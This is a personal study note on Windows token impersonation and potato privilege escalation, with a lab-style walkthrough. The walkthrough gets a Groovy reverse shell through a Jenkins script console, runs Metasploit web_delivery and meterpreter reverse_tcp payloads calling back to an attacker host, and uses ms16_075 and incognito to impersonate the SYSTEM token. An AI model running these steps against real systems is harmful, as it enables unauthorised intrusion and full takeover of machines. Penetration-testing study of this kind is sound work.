# Token Impersonation and Potato Attacks

## Token Impersonation 

Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think it as cookies for computers 

**Two Types:** 

- Delegate - Created for logging into a machine or using Remote Desktop 
- Impersonate - "non-interactive" such as attaching a network drive or a domain logon script 

![image](images/ti1.png)

![image](images/ti2.png)

![image](images/ti3.png)

**Alright, but what if a Domain Admin token was available?** 

![image](images/ti4.png)

![image](images/ti5.png)

![image](images/ti6.png)

![image](images/ti7.png)

To get to know about the impersonation privileges we can use 

![image](images/ti8.png)

![image](images/ti9.png)

here the ImpersonatePrivilege is enabled which could able to escalate to high privileged users 

Resources for [Impersonation Privileges](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)

if SeAssignPrimaryToken is enabled it could vulnerable to the potato attacks 

## Potato Attack 

Resources for [Potato Attack](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

The idea behind this vulnerability is simple to describe at a high level:

- Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.

- Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.

- Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.

So if we have service account running with the privileges to impersonate security token it is vulnerable to [juicy-potato attack](https://github.com/ohpe/juicy-potato)

In nmap result we can see there is http protocol running in the port 80 and port 50000. In port 135 RPC is running and In port 445 SMB is running.

In website in the port 50000 we found a directory askjeevs using directory busting and this directory running the jenkins. In jenkins we have script console which run groovy script so we are uploading a [groovy reverse shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)

By uploading the groovy reverse shell we got the reverse shell and start the enumeration 

```
whoami  

// SeImpersonatePrivilege is enabled 
whoami /priv 

// save the systeminfo and use windows-exploit-suggester and found it is vulnerable potato attacks 
systeminfo 

// To perform potato attack metasploit framework is easier 
msfconsole 
use exploit/multi/script/web_delivery 
options 
show targets 

// the target contains python,php,powershell,etc and we set it to powershell
set target 2 
set payload windows/meterpreter/reverse_tcp 
set lhost attacker_ip 
set srvhost victim_ip 
run

// we got the script so we are going paste the script generated in the reverse shell that make the shell got in the metasploit framework
session 1 

// now we got the shell in the msfconsole 
getuid
getprivs 
run post/multi/recon/local_exploit_suggester 

// now we are going to do potato attack 
use exploit/windows/local/ms16_075_reflection 
background 
options 
set payload windows/x64/meterpreter/reverse_tcp
run 

// now we got the shell 
load incognito 
list_tokens -u 

// we have impersonate tokens (for system)
imporsonate_token "NT AUTHORITY\SYSTEM"
shell 

// now we are system user 
whoami
nt authority\system 
```

here data is hidden in [alternate data stream](https://www.malwarebytes.com/blog/news/2015/07/introduction-to-alternate-data-streams), it is used to hide a data within a file 

```
// to see the alternate stream file 
dir /R 

// to read the file 
more < file_name 
```
